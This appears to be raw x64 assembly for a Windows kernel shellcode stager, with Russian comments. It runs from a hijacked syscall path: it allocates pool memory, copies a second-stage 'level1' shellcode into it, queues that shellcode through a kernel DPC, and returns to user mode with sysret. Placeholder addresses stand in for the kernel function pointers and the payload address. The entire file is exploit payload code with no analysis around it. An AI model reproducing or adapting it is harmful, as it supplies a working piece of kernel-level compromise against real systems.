use64

swapgs
sub rsp, 0x40
; Выделяем память под KDPC
mov r8d, 0AABBCCDDh
xor ecx, ecx
mov edx, 0x40
mov rax, 0xAAAAAAAAAAAAAAAA ; ExAllocatePoolWithTag
mov rdi, rax
call rax
cmp rax, 0
je exit
mov [rsp + 0x38], rax
; Выделяем память под shellcode level1
mov r8d, 0AABBCCDDh
xor ecx, ecx
mov edx, 0xFFFFFFFF
call rdi
cmp rax, 0
je exit
; Копируем шуллкод в новое место
xor rcx, rcx
mov ecx, 0xFFFFFFFF
mov rsi, 0xBBBBBBBBBBBBBBBB ; shellcode1 addr
mov rdi, rax ; new shellcode1 addr 
rep movsb
mov rdx, rax ; shellcode1 addr
xor r8, r8
mov rcx, [rsp + 0x38] 
mov rdi, rcx
mov rax, 0xCCCCCCCCCCCCCCCC ; KeInitializeDpc
call rax
xor r8, r8
xor rdx, rdx
mov rcx, rdi
mov rax, 0xDDDDDDDDDDDDDDDD ; KeInsertQueueDpc
call rax

exit:
add rsp, 0x40
swapgs
mov rcx, 0xEEEEEEEEEEEEEEEE
sysret